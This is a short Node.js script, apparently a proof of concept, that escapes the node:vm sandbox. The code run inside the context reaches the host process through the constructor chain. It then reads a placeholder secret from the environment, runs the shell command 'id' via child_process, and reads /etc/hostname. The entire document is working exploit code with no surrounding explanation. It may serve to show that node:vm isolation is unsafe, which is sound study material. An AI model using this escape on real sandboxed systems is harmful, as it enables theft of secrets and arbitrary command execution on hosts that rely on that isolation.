const vm = require("node:vm");

process.env.WORKFLOW_SECRET = "TOP_SECRET_VALUE";

const ctx = vm.createContext({});

const result = vm.runInContext(`
(() => {
  const proc = this.constructor.constructor("return process")();

  const secret = proc.env.WORKFLOW_SECRET;

  const exec = proc.mainModule
    .require("child_process")
    .execSync("id")
    .toString();

  const hostname = proc.mainModule
    .require("fs")
    .readFileSync("/etc/hostname", "utf8");

  return {
    env_leak: secret,
    command_execution: exec,
    hostname: hostname
  };
})()
`, ctx);

console.log(result);